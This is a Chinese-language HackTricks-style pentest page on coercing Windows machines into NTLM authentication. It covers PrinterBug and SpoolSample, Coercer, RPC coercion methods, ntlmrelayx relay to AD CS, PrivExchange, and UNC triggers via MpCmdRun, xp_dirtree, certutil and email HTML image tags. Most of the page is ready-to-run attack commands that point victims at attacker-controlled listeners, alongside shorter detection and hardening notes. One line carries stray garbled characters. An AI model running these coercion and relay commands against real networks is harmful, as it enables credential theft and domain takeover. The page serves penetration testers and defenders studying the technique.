# 强制 NTLM 特权身份验证

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) 是一个使用 MIDL 编译器以 C# 编写的**远程身份验证触发器集合**，旨在避免依赖第三方组件。

## 滥用 Spooler 服务

如果 _**Print Spooler**_ 服务处于**启用**状态，你可以使用一些已知的 AD 凭据，向域控制器的打印服务器**请求**新打印作业的**更新**，并让它**将通知发送到某个系统**。\
请注意，当打印机向任意系统发送通知时，需要对该**系统进行身份验证**。因此，攻击者可以让 _**Print Spooler**_ 服务对任意系统进行身份验证，而该服务会在此身份验证中**使用计算机帐户**。

在底层，经典的 **PrinterBug** 原语通过 `\\PIPE\\spoolss` 上的 **`RpcRemoteFindFirstPrinterChangeNotificationEx`** 实现滥用。攻击者首先打开打印机/服务器句柄，然后在 `pszLocalMachine` 中提供一个虚假的客户端名称，使目标 spooler 创建一个**指向攻击者控制主机**的通知通道。这就是其效果属于**出站身份验证强制**，而非直接执行代码的原因。<sup>[[2]](#references)</sup>\
如果你要查找 spooler 本身的 **RCE/LPE**，请参阅 [PrintNightmare](printnightmare.md)。本页重点介绍**强制身份验证和中继**。

### 查找域中的 Windows 服务器

使用 PowerShell 列出 Windows 主机。服务器通常是优先级最高的目标，因此请先重点关注它们：

```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
  Select-Object -ExpandProperty DNSHostName > servers.txt
```

### 查找正在侦听的 Spooler 服务

使用稍作修改的 @mysmartlogin（Vincent Le Toux）的 [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket)，检查 Spooler Service 是否正在侦听：

```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```

你也可以在 Linux 上使用 `rpcdump.py` 并查找 **MS-RPRN** 协议：

```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```

或者使用 **NetExec/CrackMapExec** 从 Linux 快速测试主机：

```bash
nxc smb targets.txt -u user -p password -M spooler
```

如果你想要**枚举强制认证攻击面**，而不只是检查 spooler endpoint 是否存在，请使用 **Coercer scan mode**：<sup>[[5]](#references)</sup>

```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```

之所以有用，是因为在 EPM 中看到 endpoint 只能说明 print RPC interface 已注册。**这并不**保证你当前的权限足以访问每种 coercion method，也不保证主机一定会发出可用的 authentication flow。

### 让服务向任意主机进行身份验证

你可以从[原始仓库](https://github.com/leechristensen/SpoolSample)编译 [SpoolSample](https://github.com/leechristensen/SpoolSample)。

```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```

或如果你使用 Linux，可以使用 [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) 或 [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)

```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```

使用 **Coercer**，你可以直接针对 spooler 接口，从而避免猜测公开了哪个 RPC 方法：<sup>[[5]](#references)</sup>

```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```

### 现代 RPC-over-TCP 回调

不要假设 `RpcRemoteFindFirstPrinterChangeNotificationEx` 调用成功就一定会在 TCP/445 上产生流量。**Windows 11 22H2 及更高版本默认使用 RPC over TCP 进行打印通信**；除非策略或 `RpcUseNamedPipeProtocol=1` 恢复该功能，否则会禁用 RPC over named pipes。因此，旧版仅支持 SMB 的监听器可能会报告已发送触发请求，却始终收不到回调。Microsoft 文档说明，常规打印 RPC 使用 TCP/135（Endpoint Mapper）以及动态 RPC 端口，组织可以限制此端口范围或选择固定的打印 RPC 端口。<sup>[[10]](#references)</sup>

当前的 **Impacket `ntlmrelayx.py`** 包含 RPC relay server 和一个小型 Endpoint Mapper，默认在 TCP/135 上启用。这项支持于 2025 年 6 月合并，专门针对已演示的 PrinterBug-to-AD-CS 链，使得即使受害者不回退到 SMB/WebDAV，也能中继经过身份验证的 RPC 回调。<sup>[[11]](#references)</sup>

RPC relay/EPM 支持包含在 **Impacket 0.13.0 及更高版本**中。在排查 TCP/135 监听器缺失问题之前，请确认执行的不是旧版打包的 `ntlmrelayx.py`；其帮助输出应显示两个 RPC-server 开关。<sup>[[12]](#references)</sup>

```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
  --adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```

查找 relay 输出中的 `Setting up RPC Server on port 135` 和 `RPCD: Received connection`。如果 RPC 调用返回预期错误，但 listener 没有收到任何内容，请检查受害者的 print RPC transport policy、出站过滤、DNS 解析，以及是否已有其他进程占用 TCP/135。另请确保启动 `ntlmrelayx` 时未使用 `--no-rpc-server`。

### 使用 WebClient 强制通过 HTTP 而非 SMB

在仍使用 **RPC over named pipes** 的系统上（旧版 build 或恢复了相关行为的 policy），经典 PrinterBug 通常会向 `\\attacker\share` 发起 **SMB** 认证，这仍可用于**捕获**、**中继到 HTTP targets**，或**中继到未启用 SMB signing 的目标**。\
不过，**SMB 到 SMB** 的中继通常会被 **SMB signing** 阻止，因此操作者可能更倾向于强制使用 **HTTP/WebDAV** 认证。这不是上述 RPC-over-TCP 行为的备用方案。

如果目标正在运行 **WebClient** 服务，可以用特定格式指定 listener，让 Windows 使用 **WebDAV over HTTP**：

```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```

在与 **`ntlmrelayx --adcs`** 或其他 HTTP relay 目标配合使用时，这尤其有用，因为这样可以避免依赖被强制发起连接上的 SMB relayability。需要注意的是，要使用 HTTP/WebDAV 变体，受害主机上的 **WebClient 必须正在运行**。

### 与 Unconstrained Delegation 结合使用

如果攻击者已攻陷一台配置了 [Unconstrained Delegation](unconstrained-delegation.md) 的计算机，就可以 **强制打印机向该计算机进行身份验证**。随后，打印机计算机帐户的 **TGT** 会缓存在这台启用了 unconstrained delegation 的主机内存中，攻击者便可使用 [Pass the Ticket](pass-the-ticket.md) 获取并重用该 TGT。

### 检测和加固说明

对于不需要打印的 DC、PAW 或服务器，移除 PrinterBug 最可靠的方法是停止并禁用 Spooler。若需要打印，应加固所有可能的 relay 目标（启用 SMB server signing、LDAP signing/channel binding，以及 AD CS 等 HTTP 服务上的 EPA），而不要认为仅在回连路径上阻止 TCP/445 就足够了。<sup>[[1]](#references)</sup>

```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```

如果主机仍需要**本地打印**，更精确的控制方式是通过 GPO 设置 `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`。这会阻止 spooler 接受远程客户端连接（以及打印机共享），同时保留本地服务；应用后重启 spooler，然后重复上述 MS-RPRN 可达性检查。<sup>[[13]](#references)</sup>

检测时应关联经过身份验证的 MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab` 调用，尤其是携带非本地回调值的 opnum 62/65 调用，以及 spooler 主机紧接着发起的出站 SMB、HTTP 或 RPC 连接。应基于**接口 UUID/opnum 和源/目标对**建立基线，而不只是监控对 `\PIPE\spoolss` 的访问，因为当前打印堆栈可能通过 RPC-over-TCP 发起回调。<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC 强制身份验证

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### RPC UNC 路径强制认证矩阵（会触发出站身份验证的接口/opnum）
- MS-RPRN (Print System Remote Protocol)
  - 管道：\\PIPE\\spoolss
  - IF UUID：12345678-1234-abcd-ef00-0123456789ab
  - Opnums：62 RpcRemoteFindFirstPrinterChangeNotification；65 RpcRemoteFindFirstPrinterChangeNotificationEx
  - 工具：PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
  - 管道：\\PIPE\\spoolss
  - IF UUID：76f03f96-cdfd-44fc-a22c-64950a001209
  - 说明：同一 spooler 管道上的异步打印接口；使用 Coercer 枚举指定主机上可达的方法<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
  - 管道：\\PIPE\\efsrpc（也可通过 \\PIPE\\lsarpc、\\PIPE\\samr、\\PIPE\\lsass、\\PIPE\\netlogon）
  - IF UUID：c681d488-d850-11d0-8c52-00c04fd90f7e；df1941c5-fe89-4e79-bf10-463657acf44d
  - 常被滥用的 Opnums：0、4、5、6、7、12、13、15、16
  - 工具：PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
  - 管道：\\PIPE\\netdfs
  - IF UUID：4fc742e0-4a10-11cf-8273-00aa004ae673
  - Opnums：12 NetrDfsAddStdRoot；13 NetrDfsRemoveStdRoot
  - 工具：DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
  - 管道：\\PIPE\\FssagentRpc
  - IF UUID：a8e0653c-2744-4389-a61d-7373df8b2292
  - Opnums：8 IsPathSupported；9 IsPathShadowCopied
  - 工具：ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
  - 管道：\\PIPE\\even
  - IF UUID：82273fdc-e32a-18c3-3f78-827929dc23ea
  - Opnum：9 ElfrOpenBELW
  - 工具：CheeseOunce<sup>[[1]](#references)</sup>

注意：这些方法接受可携带 UNC 路径（例如 `\\attacker\share`）的参数。处理该参数时，Windows 会使用机器/用户上下文向该 UNC 进行身份验证，从而可以捕获或 relay NetNTLM。\
对于 spooler 滥用，**MS-RPRN opnum 65** 仍是最常见、文档最完善的 primitive，因为协议规范明确指出，服务器会创建一个通知通道，连接回 `pszLocalMachine` 指定的客户端。<sup>[[2]](#references)</sup>

### MS-EVEN：ElfrOpenBELW (opnum 9) 强制认证
- 接口：\\PIPE\\even 上的 MS-EVEN（IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea）<sup>[[3]](#references)</sup>
- 调用签名：ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- 效果：目标会尝试打开提供的备份日志路径，并向攻击者控制的 UNC 进行身份验证。<sup>[[1]](#references)</sup>
- 实际用途：强制 Tier 0 资产（DC/RODC/Citrix 等）发送 NetNTLM，然后 relay 到 AD CS 端点（ESC8/ESC11 场景）或其他特权服务。<sup>[[1]](#references)</sup>

## PrivExchange

`PrivExchange` 攻击源于 **Exchange Server `PushSubscription` 功能**中的一个缺陷。该功能允许任何拥有邮箱的域用户，强制 Exchange server 通过 HTTP 向任意客户端指定的主机进行身份验证。

默认情况下，**Exchange 服务以 SYSTEM 身份运行**，并拥有过多权限（具体来说，在 2019 Cumulative Update 之前，它拥有域上的 **WriteDacl 权限**）。此缺陷可被利用来将信息 relay 到 LDAP，随后提取域 NTDS 数据库。如果无法 relay 到 LDAP，仍可利用此缺陷 relay 并向域内其他主机进行身份验证。使用任意已通过身份验证的域用户帐户成功利用此攻击，即可立即获得 Domain Admin 访问权限。

## Windows 内部

如果你已进入 Windows 机器，可以使用以下方法强制 Windows 使用特权帐户连接到服务器：

### Defender MpCmdRun

```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```

### MSSQL

```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)

```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```

或者使用另一种技术：[https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

可以使用 certutil.exe lolbin（Microsoft 签名的二进制文件）强制触发 NTLM 身份验证：

```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```

## HTML injection

### 通过邮件

如果你知道登录到想要攻陷的机器上的用户的**电子邮件地址**，只需向他发送一封带有 1x1 图片的**邮件**，例如】【：】【“】【

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

当受害者打开它时，Windows 会尝试进行身份验证。

### MitM

如果你能够执行 MitM 攻击，并向受害者访问的页面注入 HTML，请尝试注入如下图像：

```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```

## 强制并诱导 NTLM 身份验证的其他方法


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## 破解 NTLMv1

如果你能够捕获 NTLMv1 challenge，请在[此处阅读如何破解](../ntlm/index.html#ntlmv1-attack)。\
_请记住，要破解 NTLMv1，需要将 Responder challenge 设置为 "1122334455667788"_



## References

- [1] [Unit 42 – 身份验证强制技术不断演进](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN：RpcRemoteFindFirstPrinterChangeNotificationEx（Opnum 65）](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN：EventLog 远程协议](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN：ElfrOpenBELW（Opnum 9）](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Windows 11 中打印功能的 RPC 连接更新](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – ntlmrelayx 的 RPC relay server 和 Endpoint Mapper](https://github.com/fortra/impacket/pull/1974)
- [12] [Fortra Impacket 0.13.0 发布版本](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP：允许 Print Spooler 接受客户端连接](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
